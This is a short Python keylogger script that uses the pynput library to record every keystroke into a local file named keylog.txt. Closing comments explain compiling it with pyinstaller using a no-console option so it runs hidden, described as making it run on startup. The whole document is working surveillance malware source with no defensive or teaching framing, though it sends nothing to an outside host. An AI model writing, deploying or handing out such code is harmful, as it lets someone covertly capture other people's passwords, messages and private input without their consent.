from pynput import keyboard

log_file = "keylog.txt"  # File to store keystrokes

def on_press(key):
    try:
        with open(log_file, "a") as f:
            if hasattr(key, 'char') and key.char is not None:
                f.write(key.char)  # Write normal characters
            else:
                f.write(f" [{key}] ")  # Write special keys (Shift, Enter, etc.)
    except Exception as e:
        print(f"Error: {e}")

# Start listening to keyboard
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()

#to make it run on startup
#pip install pyinstaller
#pyinstaller --onefile --noconsole keylogger.py
